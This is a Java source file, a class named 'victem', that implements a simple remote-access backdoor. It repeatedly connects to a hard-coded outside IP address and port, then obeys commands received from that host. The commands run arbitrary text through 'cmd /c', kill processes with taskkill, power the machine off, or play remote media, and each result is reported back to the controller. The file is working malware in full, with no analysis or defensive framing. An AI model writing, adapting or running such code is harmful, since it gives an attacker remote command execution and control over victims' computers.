import java.net.*;
import java.io.*;
import javafx.embed.swing.JFXPanel;
import javafx.scene.media.Media;
import javafx.scene.media.MediaPlayer;

public class victem
{
	public static void wait(int in)
	{
		try
		{
			java.lang.Thread.sleep(in);
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
	}
	
	public static String[] process(String in)
	{
		int nout = 0;
		for(int i = 0; i < in.length(); i++)
		{
			if(in.charAt(i) == ' ')
			{
				nout++;
			}
		}
		String[] rv = new String[nout + 1];
		in = " " + in;
		for(int i = 0, j = -1; i < in.length(); i++)
		{
			if(in.charAt(i) == ' ')
			{
				j++;
				rv[j] = new String("");
			}
			else
			{
				rv[j] += in.charAt(i);
			}
		}
		System.out.print("Recived Order: Split Input into (");
		for (int i = 0; i < rv.length; i++)
		{
			System.out.print("[" + i + "] " + rv[i] + " ");
		}
		System.out.print(")\n");
		return rv;
	}
	
	public static void play(String[] in)
	{
		System.out.println("Recived Play Request");
		JFXPanel j = new JFXPanel();
		Media media = new Media(in[1]);
		MediaPlayer mp = new MediaPlayer(media);
		mp.play();
		wait(10000);
	}
	
	public static void kill(String[] in, String cmd)
	{
		System.out.println("Recived kill request");
		try
		{
			Process p =  Runtime.getRuntime().exec("taskkill /IM " + in[1], null, new File(System.getProperty("user.dir")));
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}
	
	public static void kill(String[] in)
	{
		System.out.println("Recived kill request");
		try
		{
			Process p =  Runtime.getRuntime().exec("taskkill /IM " + in[1], null, new File(System.getProperty("user.dir")));
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}
	
	public static void exe(String[] in)
	{
		String fc = "cmd /c ";
		System.out.println("Recived exec request");
		for(int i = 1; i < in.length; i++)
		{
			fc += in[i] + " ";
		}
		try
		{
			Process p = Runtime.getRuntime().exec(fc, null, new File(System.getProperty("user.dir")));
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}
	
	public static void sd(String[] in)
	{
		System.out.println("Recived Shutdown request");
		try
		{
			Process p =  Runtime.getRuntime().exec("shutdown /p", null, new File(System.getProperty("user.dir")));
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}
	
	public static void main(String[] args)
	{
		String[] cmds;
		String cmd;
		boolean cont = true;
		while(true)
		{
			try
			{
				Socket client = new Socket("68.196.165.171", 6066);
				DataOutputStream out = new DataOutputStream(client.getOutputStream());
				DataInputStream in = new DataInputStream(client.getInputStream());
				System.out.println("Sucess, currently conected!");
				while(true)
				{
					cmds = process(in.readUTF());
					if (cmds[0].equals("play"))
					{
						play(cmds);
						out.writeUTF("Sucess Playing");
					}
					else if(cmds[0].equals("exec"))
					{
						exe(cmds);
						out.writeUTF("Sucess Executing");
					}
					else if(cmds[0].equals("kill"))
					{
						kill(cmds);
						out.writeUTF("Sucess Killing");
					}
					else if(cmds[0].equals("shutdown"))
					{
						sd(cmds);
						out.writeUTF("Sucess Shutting down");
					}
				}
			}
			catch(IOException e)
			{
				System.out.println("Failed! trying again in 5 seconds");
				wait(5000);
			}
		}
	}
}